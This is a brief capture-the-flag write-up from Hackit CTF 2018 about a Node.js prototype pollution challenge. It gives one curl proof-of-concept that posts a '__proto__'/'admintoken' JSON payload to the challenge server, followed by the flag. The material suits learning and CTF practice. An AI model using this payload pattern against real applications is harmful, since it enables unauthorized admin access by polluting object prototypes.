# Hackit CTF 2018

## Problem

N/A

## I forgot problem name. Sorry T_T..

### Description

N/A

### Exploit

It is nodejs prototype pollution problem :)

Just POC Code.

```
curl 'http://185.168.131.1:3000/api' -H 'Origin: http://185.168.131.1:3000' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Referer: http://185.168.131.1:3000/' -H 'Connection: keep-alive' --data-binary '{"row":"__proto__","col":"admintoken","data":"shpikgod"}' --compressed
```

**flag{prototype_pollution_is_very_dangerous}**